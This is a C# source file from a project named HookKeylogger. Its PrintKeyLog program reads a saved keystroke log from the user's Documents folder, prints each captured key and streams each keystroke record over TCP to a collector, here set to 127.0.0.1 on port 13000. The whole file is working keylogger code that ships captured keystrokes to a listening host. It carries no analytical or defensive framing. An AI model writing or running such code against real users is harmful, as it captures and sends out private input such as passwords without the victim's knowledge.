using System;
using HookKeylogger.Base;
using System.IO;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using Google.Protobuf;

namespace HookKeylogger.Utils
{
    class PrintKeyLog
    {
        static void Main(string[] args)
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\keylog";
            Console.WriteLine(path);
            Console.ReadKey();
            KeyPressBuffer kpb = new KeyPressBuffer(path);
            String addr = "127.0.0.1";
            Int32 port = 13000;
            TcpClient c = new TcpClient(addr, port);

            StreamExtension stream = new StreamExtension(c.GetStream());

            foreach (KeyPress ks in kpb.Keys)
            {
                Console.Write(ks.Key);
                Console.WriteLine((Keys)ks.Key);
                if (stream.IsConnected())
                {
                    Console.WriteLine("Connected");
                    ks.WriteDelimitedTo(stream);
                }
                else
                {
                    Console.WriteLine("Not Connected!");
                    break;
                }
            }
            stream.Close();
            Console.ReadKey();
        }
    }
}
